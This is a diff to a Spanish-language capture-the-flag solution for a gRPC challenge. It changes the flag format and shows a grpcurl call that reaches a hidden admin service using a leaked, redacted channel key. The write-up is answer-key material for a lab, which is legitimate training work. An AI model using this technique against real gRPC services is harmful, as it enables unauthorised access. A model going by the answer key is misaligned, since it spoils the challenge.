@@ -1,4 +1,4 @@
-# Solución — api-grpc-04 · Silent Channel
+﻿# Solución — api-grpc-04 · Silent Channel
 
 **Categoría:** api · **Dificultad:** insane · **Puntos:** 600
 **Vuln central:** reflexión gRPC PARCIAL (servicio admin oculto) + fuga del
@@ -73,7 +73,7 @@ grpcurl -plaintext -proto vault.proto \
     -H "x-channel-key: sk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
     -d '{"vault_id":"primary","confirm":true}' \
     HOST:8080 vault.AdminService/GetVault
-#   -> { "flag": "flag{...}", "message": "vault opened on the silent channel" }
+#   -> { "flag": "HL4{...}", "message": "vault opened on the silent channel" }
 ```
 
 > Nota: como el admin no está en la reflexión, hay que pasar el descriptor a
@@ -88,7 +88,7 @@ e invoca `vault.AdminService/GetVault`. Salida verificada localmente:
 
 ```
 [3] respuesta admin: message='vault opened on the silent channel'
-[3] FLAG: flag{...}
+[3] FLAG: HL4{...}
 ```
 
 Requiere `pip install grpcio protobuf`.
